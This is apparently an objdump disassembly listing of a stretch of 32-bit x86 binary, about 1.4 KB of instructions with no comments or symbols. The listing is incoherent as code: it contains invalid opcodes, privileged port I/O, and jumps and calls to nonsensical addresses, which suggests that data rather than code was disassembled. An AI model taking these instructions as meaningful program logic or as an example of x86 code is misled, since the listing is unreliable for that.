  403c9c:	86 41 a8             	xchg   %al,-0x58(%ecx)
  403c9f:	69 01 3f f4 7d 2b    	imul   $0x2b7df43f,(%ecx),%eax
  403ca5:	a1 ed 79 81 65       	mov    0x658179ed,%eax
  403caa:	0b 1a                	or     (%edx),%ebx
  403cac:	e4 b2                	in     $0xb2,%al
  403cae:	ec                   	in     (%dx),%al
  403caf:	75 f7                	jne    0x403ca8
  403cb1:	ec                   	in     (%dx),%al
  403cb2:	03 8d 6d d8 77 12    	add    0x1277d86d(%ebp),%ecx
  403cb8:	92                   	xchg   %eax,%edx
  403cb9:	a9 54 8b d0 98       	test   $0x98d08b54,%eax
  403cbe:	bc 5c 45 96 cf       	mov    $0xcf96455c,%esp
  403cc3:	e7 7e                	out    %eax,$0x7e
  403cc5:	42                   	inc    %edx
  403cc6:	33 35 6b c3 d5 70    	xor    0x70d5c36b,%esi
  403ccc:	19 01                	sbb    %eax,(%ecx)
  403cce:	5c                   	pop    %esp
  403ccf:	5a                   	pop    %edx
  403cd0:	a0 96 76 dd 74       	mov    0x74dd7696,%al
  403cd5:	b2 aa                	mov    $0xaa,%dl
  403cd7:	16                   	push   %ss
  403cd8:	01 65 36             	add    %esp,0x36(%ebp)
  403cdb:	dc 9f e6 63 a7 1a    	fcompl 0x1aa763e6(%edi)
  403ce1:	21 af bb 44 7a a8    	and    %ebp,-0x5785bb45(%edi)
  403ce7:	b7 9a                	mov    $0x9a,%bh
  403ce9:	b5 da                	mov    $0xda,%ch
  403ceb:	56                   	push   %esi
  403cec:	fd                   	std
  403ced:	da a0 b5 49 0a a0    	fisubl -0x5ff5b64b(%eax)
  403cf3:	ae                   	scas   %es:(%edi),%al
  403cf4:	95                   	xchg   %eax,%ebp
  403cf5:	04 34                	add    $0x34,%al
  403cf7:	56                   	push   %esi
  403cf8:	ba d5 18 90 b6       	mov    $0xb69018d5,%edx
  403cfd:	99                   	cltd
  403cfe:	7c 92                	jl     0x403c92
  403d00:	49                   	dec    %ecx
  403d01:	dc 9d 34 93 33 8e    	fcompl -0x71cc6ccc(%ebp)
  403d07:	7e 95                	jle    0x403c9e
  403d09:	ee                   	out    %al,(%dx)
  403d0a:	b0 da                	mov    $0xda,%al
  403d0c:	45                   	inc    %ebp
  403d0d:	5d                   	pop    %ebp
  403d0e:	45                   	inc    %ebp
  403d0f:	c2 99 c8             	ret    $0xc899
  403d12:	27                   	daa
  403d13:	3d 77 bb 4e d8       	cmp    $0xd84ebb77,%eax
  403d18:	0c 81                	or     $0x81,%al
  403d1a:	f2 14 a9             	repnz adc $0xa9,%al
  403d1d:	0b 3f                	or     (%edi),%edi
  403d1f:	bb e0 75 14 a3       	mov    $0xa31475e0,%ebx
  403d24:	7d cc                	jge    0x403cf2
  403d26:	5d                   	pop    %ebp
  403d27:	d7                   	xlat   %ds:(%ebx)
  403d28:	1f                   	pop    %ds
  403d29:	bc ad e1 e9 fc       	mov    $0xfce9e1ad,%esp
  403d2e:	a3 f1 64 4f 5c       	mov    %eax,0x5c4f64f1
  403d33:	ec                   	in     (%dx),%al
  403d34:	ae                   	scas   %es:(%edi),%al
  403d35:	28 fe                	sub    %bh,%dh
  403d37:	96                   	xchg   %eax,%esi
  403d38:	f3 b6 2d             	repz mov $0x2d,%dh
  403d3b:	0e                   	push   %cs
  403d3c:	f8                   	clc
  403d3d:	9b                   	fwait
  403d3e:	17                   	pop    %ss
  403d3f:	ba 48 4b 17 13       	mov    $0x13174b48,%edx
  403d44:	94                   	xchg   %eax,%esp
  403d45:	00 b6 43 51 10 72    	add    %dh,0x72105143(%esi)
  403d4b:	7a 54                	jp     0x403da1
  403d4d:	94                   	xchg   %eax,%esp
  403d4e:	05 20 ed d5 5d       	add    $0x5dd5ed20,%eax
  403d53:	e7 ca                	out    %eax,$0xca
  403d55:	c3                   	ret
  403d56:	fa                   	cli
  403d57:	d9 ef                	(bad)
  403d59:	f9                   	stc
  403d5a:	cc                   	int3
  403d5b:	6a 86                	push   $0xffffff86
  403d5d:	cc                   	int3
  403d5e:	05 07 f0 8b fe       	add    $0xfe8bf007,%eax
  403d63:	e8 b6 1d 9e 97       	call   0x97de5b1e
  403d68:	eb c1                	jmp    0x403d2b
  403d6a:	43                   	inc    %ebx
  403d6b:	19 22                	sbb    %esp,(%edx)
  403d6d:	4d                   	dec    %ebp
  403d6e:	53                   	push   %ebx
  403d6f:	3e 9c                	ds pushf
  403d71:	52                   	push   %edx
  403d72:	31 12                	xor    %edx,(%edx)
  403d74:	eb af                	jmp    0x403d25
  403d76:	46                   	inc    %esi
  403d77:	2b 0b                	sub    (%ebx),%ecx
  403d79:	c1 8a 49 6a cc d2 f7 	rorl   $0xf7,-0x2d3395b7(%edx)
  403d80:	65 1c fb             	gs sbb $0xfb,%al
  403d83:	50                   	push   %eax
  403d84:	ad                   	lods   %ds:(%esi),%eax
  403d85:	22 a3 e1 61 29 28    	and    0x282961e1(%ebx),%ah
  403d8b:	98                   	cwtl
  403d8c:	9b                   	fwait
  403d8d:	ad                   	lods   %ds:(%esi),%eax
  403d8e:	3f                   	aas
  403d8f:	b8 5c de 38 6e       	mov    $0x6e38de5c,%eax
  403d94:	75 29                	jne    0x403dbf
  403d96:	d4 2f                	aam    $0x2f
  403d98:	00 dd                	add    %bl,%ch
  403d9a:	77 57                	ja     0x403df3
  403d9c:	8e f1                	mov    %ecx,%?
  403d9e:	e0 e5                	loopne 0x403d85
  403da0:	7c 95                	jl     0x403d37
  403da2:	20 7c ef 5d          	and    %bh,0x5d(%edi,%ebp,8)
  403da6:	53                   	push   %ebx
  403da7:	66 8c 8b c6 a3 c5 8a 	data16 mov %cs,-0x753a5c3a(%ebx)
  403dae:	f1                   	int1
  403daf:	7a 95                	jp     0x403d46
  403db1:	7a ec                	jp     0x403d9f
  403db3:	4f                   	dec    %edi
  403db4:	05 ec 09 49 54       	add    $0x544909ec,%eax
  403db9:	d2 da                	rcr    %cl,%dl
  403dbb:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403dbc:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403dbd:	df 8b 15 6b bc 0c    	fisttps 0xcbc6b15(%ebx)
  403dc3:	a1 e3 6c 4f 1a       	mov    0x1a4f6ce3,%eax
  403dc8:	5a                   	pop    %edx
  403dc9:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403dca:	b8 c0 e3 8f 9b       	mov    $0x9b8fe3c0,%eax
  403dcf:	cd a5                	int    $0xa5
  403dd1:	f8                   	clc
  403dd2:	0b 54 8c 2a          	or     0x2a(%esp,%ecx,4),%edx
  403dd6:	89 6d 19             	mov    %ebp,0x19(%ebp)
  403dd9:	01 38                	add    %edi,(%eax)
  403ddb:	84 a2 39 fb c6 15    	test   %ah,0x15c6fb39(%edx)
  403de1:	c5 81 99 6b b8 ae    	lds    -0x51479467(%ecx),%eax
  403de7:	98                   	cwtl
  403de8:	c4 8b 37 1f 21 4d    	les    0x4d211f37(%ebx),%ecx
  403dee:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403def:	af                   	scas   %es:(%edi),%eax
  403df0:	f7 af 87 2b 98 2a    	imull  0x2a982b87(%edi)
  403df6:	57                   	push   %edi
  403df7:	be c5 04 6a 1a       	mov    $0x1a6a04c5,%esi
  403dfc:	b9 10 23 59 a4       	mov    $0xa4592310,%ecx
  403e01:	77 6c                	ja     0x403e6f
  403e03:	d0 2c ac             	shrb   $1,(%esp,%ebp,4)
  403e06:	90                   	nop
  403e07:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403e08:	8c 33                	mov    %?,(%ebx)
  403e0a:	71 f9                	jno    0x403e05
  403e0c:	81 b1 56 0b ba 28 ed 	xorl   $0x62b691ed,0x28ba0b56(%ecx)
  403e13:	91 b6 62 
  403e16:	47                   	inc    %edi
  403e17:	ab                   	stos   %eax,%es:(%edi)
  403e18:	35 29 f3 c1 ba       	xor    $0xbac1f329,%eax
  403e1d:	61                   	popa
  403e1e:	b6 15                	mov    $0x15,%dh
  403e20:	2c c5                	sub    $0xc5,%al
  403e22:	16                   	push   %ss
  403e23:	d7                   	xlat   %ds:(%ebx)
  403e24:	84 ea                	test   %ch,%dl
  403e26:	43                   	inc    %ebx
  403e27:	d6                   	salc
  403e28:	ce                   	into
  403e29:	83 f7 5c             	xor    $0x5c,%edi
  403e2c:	e4 75                	in     $0x75,%al
  403e2e:	60                   	pusha
  403e2f:	ed                   	in     (%dx),%eax
  403e30:	19 d8                	sbb    %ebx,%eax
  403e32:	42                   	inc    %edx
  403e33:	78 b3                	js     0x403de8
  403e35:	72 d2                	jb     0x403e09
  403e37:	fc                   	cld
  403e38:	de 2c a8             	fisubrs (%eax,%ebp,4)
  403e3b:	5a                   	pop    %edx
  403e3c:	d2 38                	sarb   %cl,(%eax)
  403e3e:	dc eb                	fsubr  %st,%st(3)
  403e40:	b4 9f                	mov    $0x9f,%ah
  403e42:	27                   	daa
  403e43:	0a 47 f4             	or     -0xc(%edi),%al
  403e46:	8b e4                	mov    %esp,%esp
  403e48:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403e49:	5b                   	pop    %ebx
  403e4a:	a1 35 9a d9 13       	mov    0x13d99a35,%eax
  403e4f:	34 d9                	xor    $0xd9,%al
  403e51:	50                   	push   %eax
  403e52:	a8 cb                	test   $0xcb,%al
  403e54:	cd 95                	int    $0x95
  403e56:	0e                   	push   %cs
  403e57:	64 4c                	fs dec %esp
  403e59:	51                   	push   %ecx
  403e5a:	ae                   	scas   %es:(%edi),%al
  403e5b:	fd                   	std
  403e5c:	ae                   	scas   %es:(%edi),%al
  403e5d:	82 71 53 41          	xorb   $0x41,0x53(%ecx)
  403e61:	ef                   	out    %eax,(%dx)
  403e62:	ce                   	into
  403e63:	18 10                	sbb    %dl,(%eax)
  403e65:	10 ff                	adc    %bh,%bh
  403e67:	13 e5                	adc    %ebp,%esp
  403e69:	d6                   	salc
  403e6a:	be 9a fd 99 19       	mov    $0x1999fd9a,%esi
  403e6f:	34 3e                	xor    $0x3e,%al
  403e71:	8d                   	lea    (bad),%edi
  403e72:	fc                   	cld
  403e73:	b5 cc                	mov    $0xcc,%ch
  403e75:	98                   	cwtl
  403e76:	f0 37                	lock aaa
  403e78:	f7 54 67 9a          	notl   -0x66(%edi,%eiz,2)
  403e7c:	f4                   	hlt
  403e7d:	6c                   	insb   (%dx),%es:(%edi)
  403e7e:	1a 2b                	sbb    (%ebx),%ch
  403e80:	cd c7                	int    $0xc7
  403e82:	e0 3a                	loopne 0x403ebe
  403e84:	6e                   	outsb  %ds:(%esi),(%dx)
  403e85:	1c 47                	sbb    $0x47,%al
  403e87:	26 bc f0 7e 73 b3    	es mov $0xb3737ef0,%esp
  403e8d:	07                   	pop    %es
  403e8e:	b2 7e                	mov    $0x7e,%dl
  403e90:	f2 78 67             	bnd js 0x403efa
  403e93:	0b 95 95 c9 a1 63    	or     0x63a1c995(%ebp),%edx
  403e99:	04 79                	add    $0x79,%al
  403e9b:	3b c7                	cmp    %edi,%eax
  403e9d:	ae                   	scas   %es:(%edi),%al
  403e9e:	2e e2 6e             	loop,pn 0x403f0f
  403ea1:	17                   	pop    %ss
  403ea2:	8a 50 54             	mov    0x54(%eax),%dl
  403ea5:	29 ba 51 fa fc 66    	sub    %edi,0x66fcfa51(%edx)
  403eab:	aa                   	stos   %al,%es:(%edi)
  403eac:	9b                   	fwait
  403ead:	c0 d4 71             	rcl    $0x71,%ah
  403eb0:	55                   	push   %ebp
  403eb1:	c8 a5 f3 e5          	enter  $0xf3a5,$0xe5
  403eb5:	c4 a9 6f 9d 7e 22    	les    0x227e9d6f(%ecx),%ebp
  403ebb:	d8 0f                	fmuls  (%edi)
  403ebd:	e8 c6 68 e6 eb       	call   0xec26a788
  403ec2:	99                   	cltd
  403ec3:	0b 91 44 02 62 a8    	or     -0x579dfdbc(%ecx),%edx
  403ec9:	0c 3a                	or     $0x3a,%al
  403ecb:	b1 c8                	mov    $0xc8,%cl
  403ecd:	2d 1e 9e 0b a1       	sub    $0xa10b9e1e,%eax
  403ed2:	24 34                	and    $0x34,%al
  403ed4:	bb bd 84 db 7e       	mov    $0x7edb84bd,%ebx
  403ed9:	36 47                	ss inc %edi
  403edb:	74 e0                	je     0x403ebd
  403edd:	d6                   	salc
  403ede:	ef                   	out    %eax,(%dx)
  403edf:	62 9e 3f 45 8a 6f    	bound  %ebx,0x6f8a453f(%esi)
  403ee5:	79 5f                	jns    0x403f46
  403ee7:	8f                   	(bad)
  403ee8:	13 2f                	adc    (%edi),%ebp
  403eea:	20 fd                	and    %bh,%ch
  403eec:	c9                   	leave
  403eed:	ff 8f af 6a e6 6a    	decl   0x6ae66aaf(%edi)
  403ef3:	1a e8                	sbb    %al,%ch
  403ef5:	ee                   	out    %al,(%dx)
  403ef6:	1f                   	pop    %ds
  403ef7:	be b6 a6 d9 13       	mov    $0x13d9a6b6,%esi
  403efc:	34 63                	xor    $0x63,%al
  403efe:	8f                   	(bad)
  403eff:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403f00:	ff 15 f1 4a aa 6c    	call   *0x6caa4af1
  403f06:	bf 99 d6 6c ff       	mov    $0xff6cd699,%edi
  403f0b:	e8 8b 4f b3 e9       	call   0xe9f38e9b
  403f10:	c0 e3 df             	shl    $0xdf,%bl
  403f13:	71 c7                	jno    0x403edc
  403f15:	d5 3a                	aad    $0x3a
  403f17:	19 27                	sbb    %esp,(%edi)
  403f19:	5e                   	pop    %esi
  403f1a:	02 b2 ff fe aa b1    	add    -0x4e550101(%edx),%dh
  403f20:	b5 1c                	mov    $0x1c,%ch
  403f22:	17                   	pop    %ss
  403f23:	c8 88 a5 19          	enter  $0xa588,$0x19
  403f27:	f6 8f 57 db 3a c2 d6 	testb  $0xd6,-0x3dc524a9(%edi)
  403f2e:	45                   	inc    %ebp
  403f2f:	28 99 2e f2 ae 97    	sub    %bl,-0x68510dd2(%ecx)
  403f35:	06                   	push   %es
  403f36:	ba de c4 d2 ca       	mov    $0xcad2c4de,%edx
  403f3b:	14 4b                	adc    $0x4b,%al
  403f3d:	8b 4a e4             	mov    -0x1c(%edx),%ecx
  403f40:	41                   	inc    %ecx
  403f41:	3e ac                	lods   %ds:(%esi),%al
  403f43:	88 c1                	mov    %al,%cl
  403f45:	94                   	xchg   %eax,%esp
  403f46:	7a d7                	jp     0x403f1f
  403f48:	3b 6b 45             	cmp    0x45(%ebx),%ebp
  403f4b:	d9 bc 77 6e 27 e0 0b 	fnstcw 0xbe0276e(%edi,%esi,2)
  403f52:	9b                   	fwait
  403f53:	af                   	scas   %es:(%edi),%eax
  403f54:	97                   	xchg   %eax,%edi
  403f55:	fd                   	std
  403f56:	f5                   	cmc
  403f57:	56                   	push   %esi
  403f58:	6b f3 bf             	imul   $0xffffffbf,%ebx,%esi
  403f5b:	ec                   	in     (%dx),%al
  403f5c:	65 30 66 ef          	xor    %ah,%gs:-0x11(%esi)
  403f60:	ca 43 f2             	lret   $0xf243
  403f63:	a9 0a 1c 87 69       	test   $0x69871c0a,%eax
  403f68:	88 32                	mov    %dh,(%edx)
  403f6a:	ad                   	lods   %ds:(%esi),%eax
  403f6b:	62 b5 9f 2b a7 b0    	bound  %esi,-0x4f58d461(%ebp)
  403f71:	54                   	push   %esp
  403f72:	d6                   	salc
  403f73:	fb                   	sti
  403f74:	b0 2e                	mov    $0x2e,%al
  403f76:	71 0b                	jno    0x403f83
  403f78:	f5                   	cmc
  403f79:	d1 85 52 6e ce 1d    	roll   $1,0x1dce6e52(%ebp)
  403f7f:	22 5a 62             	and    0x62(%edx),%bl
  403f82:	60                   	pusha
  403f83:	e6 8b                	out    %al,$0x8b
  403f85:	ec                   	in     (%dx),%al
  403f86:	73 d3                	jae    0x403f5b
  403f88:	0e                   	push   %cs
  403f89:	b3 d5                	mov    $0xd5,%bl
  403f8b:	66 aa                	data16 stos %al,%es:(%edi)
  403f8d:	97                   	xchg   %eax,%edi
  403f8e:	48                   	dec    %eax
  403f8f:	4e                   	dec    %esi
  403f90:	59                   	pop    %ecx
  403f91:	31 2d f5 b0 25 b5    	xor    %ebp,0xb525b0f5
  403f97:	b4 84                	mov    $0x84,%ah
  403f99:	0b 7b 2a             	or     0x2a(%ebx),%edi
  403f9c:	56                   	push   %esi
  403f9d:	73 21                	jae    0x403fc0
  403f9f:	2d e9 61 aa c7       	sub    $0xc7aa61e9,%eax
  403fa4:	2b d8                	sub    %eax,%ebx
  403fa6:	b1 35                	mov    $0x35,%cl
  403fa8:	fb                   	sti
  403fa9:	7a 08                	jp     0x403fb3
  403fab:	43                   	inc    %ebx
  403fac:	2f                   	das
  403fad:	f6 87 cf 49 7e ea 28 	testb  $0x28,-0x1581b631(%edi)
  403fb4:	c9                   	leave
  403fb5:	56                   	push   %esi
  403fb6:	28 4f 61             	sub    %cl,0x61(%edi)
  403fb9:	d7                   	xlat   %ds:(%ebx)
  403fba:	40                   	inc    %eax
  403fbb:	90                   	nop
  403fbc:	81 f1 f8 29 ee c0    	xor    $0xc0ee29f8,%ecx
  403fc2:	e7 7e                	out    %eax,$0x7e
  403fc4:	84 cb                	test   %cl,%bl
  403fc6:	eb 5b                	jmp    0x404023
  403fc8:	e7 ba                	out    %eax,$0xba
  403fca:	a8 c6                	test   $0xc6,%al
  403fcc:	3c 40                	cmp    $0x40,%al
  403fce:	fc                   	cld
  403fcf:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403fd0:	61                   	popa
  403fd1:	69 ed 32 c7 4d 70    	imul   $0x704dc732,%ebp,%ebp
  403fd7:	f2 9c                	repnz pushf
  403fd9:	33 36                	xor    (%esi),%esi
  403fdb:	79 6d                	jns    0x40404a
  403fdd:	e0 cc                	loopne 0x403fab
  403fdf:	6a 02                	push   $0x2
  403fe1:	8e 66 01             	mov    0x1(%esi),%fs
  403fe4:	2b 23                	sub    (%ebx),%esp
  403fe6:	6d                   	insl   (%dx),%es:(%edi)
  403fe7:	73 12                	jae    0x403ffb
  403fe9:	89 c3                	mov    %eax,%ebx
  403feb:	80 5b 2e 46          	sbbb   $0x46,0x2e(%ebx)
  403fef:	0d 38 a6 a5 66       	or     $0x66a5a638,%eax
  403ff4:	e4 7e                	in     $0x7e,%al
  403ff6:	e3 9d                	jecxz  0x403f95
  403ff8:	6d                   	insl   (%dx),%es:(%edi)
  403ff9:	fc                   	cld
  403ffa:	e4 d2                	in     $0xd2,%al
  403ffc:	c5 7b be             	lds    -0x42(%ebx),%edi
  403fff:	65 7c e6             	gs jl  0x403fe8
  404002:	a2 bc 99 f5 c9       	mov    %al,0xc9f599bc
  404007:	86 00                	xchg   %al,(%eax)
  404009:	e3 65                	jecxz  0x404070
  40400b:	06                   	push   %es
  40400c:	2e 7d b7             	jge,pn 0x403fc6
  40400f:	e4 7e                	in     $0x7e,%al
  404011:	97                   	xchg   %eax,%edi
  404012:	c7                   	(bad)
  404013:	6f                   	outsl  %ds:(%esi),(%dx)
  404014:	e0 75                	loopne 0x40408b
  404016:	2d 10 d3 d0 8e       	sub    $0x8ed0d310,%eax
  40401b:	42                   	inc    %edx
  40401c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40401d:	11 9f 3b ac d7 04    	adc    %ebx,0x4d7ac3b(%edi)
  404023:	34 5d                	xor    $0x5d,%al
  404025:	15 6d b2 2b b1       	adc    $0xb12bb26d,%eax
  40402a:	7e a4                	jle    0x403fd0
  40402c:	74 56                	je     0x404084
  40402e:	01 49 51             	add    %ecx,0x51(%ecx)
  404031:	ce                   	into
  404032:	60                   	pusha
  404033:	44                   	inc    %esp
  404034:	02 59 61             	add    0x61(%ecx),%bl
  404037:	f0 9e                	lock sahf
  404039:	26 a6                	cmpsb  %es:(%edi),%es:(%esi)
  40403b:	07                   	pop    %es
  40403c:	87 de                	xchg   %ebx,%esi
  40403e:	63 a3 95 0a 59 da    	arpl   %esp,-0x25a6f56b(%ebx)
  404044:	34 9b                	xor    $0x9b,%al
  404046:	b9 7c 43 2b d2       	mov    $0xd22b437c,%ecx
  40404b:	04 34                	add    $0x34,%al
  40404d:	1d 13 09 5c 95       	sbb    $0x955c0913,%eax
  404052:	82 ad ea ad ed 4d e0 	subb   $0xe0,0x4dedadea(%ebp)
  404059:	fb                   	sti
  40405a:	49                   	dec    %ecx
  40405b:	80 b4 39 5a 68 c7 84 	xorb   $0xab,-0x7b3897a6(%ecx,%edi,1)
  404062:	ab 
  404063:	71 76                	jno    0x4040db
  404065:	39 2b                	cmp    %ebp,(%ebx)
  404067:	9f                   	lahf
  404068:	56                   	push   %esi
  404069:	d9 39                	fnstcw (%ecx)
  40406b:	e4 ad                	in     $0xad,%al
  40406d:	4a                   	dec    %edx
  40406e:	1e                   	push   %ds
  40406f:	ee                   	out    %al,(%dx)
  404070:	5d                   	pop    %ebp
  404071:	d6                   	salc
  404072:	ec                   	in     (%dx),%al
  404073:	25 f9 c4 7d 0b       	and    $0xb7dc4f9,%eax
  404078:	ba 51 78 1b e5       	mov    $0xe51b7851,%edx
  40407d:	1f                   	pop    %ds
  40407e:	1f                   	pop    %ds
  40407f:	e1 ae                	loope  0x40402f
  404081:	59                   	pop    %ecx
  404082:	14 18                	adc    $0x18,%al
  404084:	4d                   	dec    %ebp
  404085:	ff 74 ba 5c          	push   0x5c(%edx,%edi,4)
  404089:	ba 8d 42 4d 8a       	mov    $0x8a4d428d,%edx
  40408e:	cf                   	iret
  40408f:	46                   	inc    %esi
  404090:	75 55                	jne    0x4040e7
  404092:	3c eb                	cmp    $0xeb,%al
  404094:	03 da                	add    %edx,%ebx
  404096:	aa                   	stos   %al,%es:(%edi)
  404097:	8b f9                	mov    %ecx,%edi
  404099:	de 05 be cd e7 17    	fiadds 0x17e7cdbe
  40409f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4040a0:	e0 15                	loopne 0x4040b7
  4040a2:	67 af                	scas   %es:(%di),%eax
  4040a4:	8f                   	(bad)
  4040a5:	2f                   	das
  4040a6:	e6 dc                	out    %al,$0xdc
  4040a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4040a9:	26 f7 21             	mull   %es:(%ecx)
  4040ac:	c6                   	(bad)
  4040ad:	ec                   	in     (%dx),%al
  4040ae:	d9 2b                	fldcw  (%ebx)
  4040b0:	76 79                	jbe    0x40412b
  4040b2:	58                   	pop    %eax
  4040b3:	9c                   	pushf
  4040b4:	ed                   	in     (%dx),%eax
  4040b5:	c5 39                	lds    (%ecx),%edi
  4040b7:	49                   	dec    %ecx
  4040b8:	d3 1d 32 59 fe 42    	rcrl   %cl,0x42fe5932
  4040be:	da 1e                	ficompl (%esi)
  4040c0:	c7                   	(bad)
  4040c1:	8e ce                	mov    %esi,%cs
  4040c3:	55                   	push   %ebp
  4040c4:	66 b2 31             	data16 mov $0x31,%dl
  4040c7:	f8                   	clc
  4040c8:	75 16                	jne    0x4040e0
  4040ca:	49                   	dec    %ecx
  4040cb:	80 66 ca 8b          	andb   $0x8b,-0x36(%esi)
  4040cf:	84 8e 34 f6 28 1c    	test   %cl,0x1c28f634(%esi)
  4040d5:	c4 66 c9             	les    -0x37(%esi),%esp
  4040d8:	12 2f                	adc    (%edi),%ch
  4040da:	c1 fb e6             	sar    $0xe6,%ebx
  4040dd:	50                   	push   %eax
  4040de:	d1 e3                	shl    $1,%ebx
  4040e0:	f9                   	stc
  4040e1:	bc 22 ed a8 6f       	mov    $0x6fa8ed22,%esp
  4040e6:	20 18                	and    %bl,(%eax)
  4040e8:	88 4e b0             	mov    %cl,-0x50(%esi)
  4040eb:	24 d3                	and    $0xd3,%al
  4040ed:	14 95                	adc    $0x95,%al
  4040ef:	6d                   	insl   (%dx),%es:(%edi)
  4040f0:	89 2e                	mov    %ebp,(%esi)
  4040f2:	11 da                	adc    %ebx,%edx
  4040f4:	06                   	push   %es
  4040f5:	ec                   	in     (%dx),%al
  4040f6:	dc 8d ec 45 eb 9f    	fmull  -0x6014ba14(%ebp)
  4040fc:	37                   	aaa
  4040fd:	30 a2 a5 ca ec a9    	xor    %ah,-0x5613355b(%edx)
  404103:	43                   	inc    %ebx
  404104:	98                   	cwtl
  404105:	eb 7f                	jmp    0x404186
  404107:	54                   	push   %esp
  404108:	b6 5a                	mov    $0x5a,%dh
  40410a:	fb                   	sti
  40410b:	41                   	inc    %ecx
  40410c:	80 e4 4c             	and    $0x4c,%ah
  40410f:	cb                   	lret
  404110:	87 7b 9b             	xchg   %edi,-0x65(%ebx)
  404113:	3e 3e b6 01          	ds ds mov $0x1,%dh
  404117:	18 3b                	sbb    %bh,(%ebx)
  404119:	79 86                	jns    0x4040a1
  40411b:	58                   	pop    %eax
  40411c:	c7                   	(bad)
  40411d:	28 73 de             	sub    %dh,-0x22(%ebx)
  404120:	ed                   	in     (%dx),%eax
  404121:	ec                   	in     (%dx),%al
  404122:	fd                   	std
  404123:	23 14 b8             	and    (%eax,%edi,4),%edx
  404126:	a8 0f                	test   $0xf,%al
  404128:	81 13 5c ad fa 5d    	adcl   $0x5dfaad5c,(%ebx)
  40412e:	68 95 5d a9 33       	push   $0x33a95d95
  404133:	15 64 04 98 cb       	adc    $0xcb980464,%eax
  404138:	01 01                	add    %eax,(%ecx)
  40413a:	82 dd 50             	sbb    $0x50,%ch
  40413d:	5e                   	pop    %esi
  40413e:	54                   	push   %esp
  40413f:	c3                   	ret
  404140:	a9 f5 fe fe eb       	test   $0xebfefef5,%eax
  404145:	33 47 56             	xor    0x56(%edi),%eax
  404148:	06                   	push   %es
  404149:	7f d7                	jg     0x404122
  40414b:	47                   	inc    %edi
  40414c:	b8 f3 f7 f6 a6       	mov    $0xa6f6f7f3,%eax
  404151:	b4 0e                	mov    $0xe,%ah
  404153:	76 5e                	jbe    0x4041b3
  404155:	fe 41 bb             	incb   -0x45(%ecx)
  404158:	16                   	push   %ss
  404159:	c9                   	leave
  40415a:	1b b6 02 9c 6a d6    	sbb    -0x299563fe(%esi),%esi
  404160:	67 2d b2 9e d2 1f    	addr16 sub $0x1fd29eb2,%eax
  404166:	64 4f                	fs dec %edi
  404168:	e1 21                	loope  0x40418b
  40416a:	17                   	pop    %ss
  40416b:	eb 17                	jmp    0x404184
  40416d:	b3 2b                	mov    $0x2b,%bl
  40416f:	f3 d1 08             	repz rorl $1,(%eax)
  404172:	a1 30 58 07 55       	mov    0x55075830,%eax
  404177:	29 d2                	sub    %edx,%edx
  404179:	ae                   	scas   %es:(%edi),%al
  40417a:	78 72                	js     0x4041ee
  40417c:	4c                   	dec    %esp
  40417d:	a0 37 ef 3c e2       	mov    0xe23cef37,%al
  404182:	45                   	inc    %ebp
  404183:	3e 7f 49             	jg,pt  0x4041cf
  404186:	02 94 1b c8 b2 85 d1 	add    -0x2e7a4d38(%ebx,%ebx,1),%dl
  40418d:	1d b1 48 a6 dc       	sbb    $0xdca648b1,%eax
  404192:	c9                   	leave
  404193:	b7 5f                	mov    $0x5f,%bh
  404195:	28 fd                	sub    %bh,%ch
  404197:	f8                   	clc
  404198:	29 f8                	sub    %edi,%eax
  40419a:	f6 5e 66             	negb   0x66(%esi)
  40419d:	03 6d 4e             	add    0x4e(%ebp),%ebp
  4041a0:	a0 17 e6 44 78       	mov    0x7844e617,%al
  4041a5:	26 27                	es daa
  4041a7:	4b                   	dec    %ebx
  4041a8:	04 b6                	add    $0xb6,%al
  4041aa:	2d 2a 4b d0 e6       	sub    $0xe6d04b2a,%eax
  4041af:	30 ee                	xor    %ch,%dh
  4041b1:	36 d3 6c 71 2f       	shrl   %cl,%ss:0x2f(%ecx,%esi,2)
  4041b6:	12 4f e0             	adc    -0x20(%edi),%cl
  4041b9:	d6                   	salc
  4041ba:	33 b6 6c e8 5a 29    	xor    0x295ae86c(%esi),%esi
  4041c0:	7d 06                	jge    0x4041c8
  4041c2:	5b                   	pop    %ebx
  4041c3:	5c                   	pop    %esp
  4041c4:	ab                   	stos   %eax,%es:(%edi)
  4041c5:	e2 40                	loop   0x404207
  4041c7:	61                   	popa
  4041c8:	55                   	push   %ebp
  4041c9:	c8 ce 3d 15          	enter  $0x3dce,$0x15
  4041cd:	ba 7a 8c b6 24       	mov    $0x24b68c7a,%edx
  4041d2:	ea a2 4f e9 e2 16 1f 	ljmp   $0x1f16,$0xe2e94fa2
  4041d9:	12 da                	adc    %dl,%bl
  4041db:	8f                   	(bad)
  4041dc:	1e                   	push   %ds
  4041dd:	13 a7 72 46 c0 a8    	adc    -0x573fb98e(%edi),%esp
  4041e3:	a2 fc 44 34 d8       	mov    %al,0xd83444fc
  4041e8:	47                   	inc    %edi
  4041e9:	fe 04 b9             	incb   (%ecx,%edi,4)
  4041ec:	af                   	scas   %es:(%edi),%eax
  4041ed:	68 c0 56 7a a1       	push   $0xa17a56c0
  4041f2:	71 55                	jno    0x404249
  4041f4:	8c 48 c1             	mov    %cs,-0x3f(%eax)
  4041f7:	b8 f1 de 93 8d       	mov    $0x8d93def1,%eax
  4041fc:	7c 70                	jl     0x40426e
  4041fe:	33 4c 90 0e          	xor    0xe(%eax,%edx,4),%ecx
  404202:	89 64 36 5b          	mov    %esp,0x5b(%esi,%esi,1)
  404206:	d9 b8 56 94 77 84    	fnstcw -0x7b886baa(%eax)
  40420c:	d1 e4                	shl    $1,%esp
  40420e:	2f                   	das
  40420f:	a8 c8                	test   $0xc8,%al
  404211:	14 a9                	adc    $0xa9,%al
  404213:	e2 13                	loop   0x404228
  404215:	18 9e 54 3c 32 1a    	sbb    %bl,0x1a323c54(%esi)
  40421b:	cf                   	iret
  40421c:	37                   	aaa
  40421d:	3b 60 98             	cmp    -0x68(%eax),%esp
  404220:	54                   	push   %esp
  404221:	e8 63 e6 35 35       	call   0x35762889
  404226:	06                   	push   %es
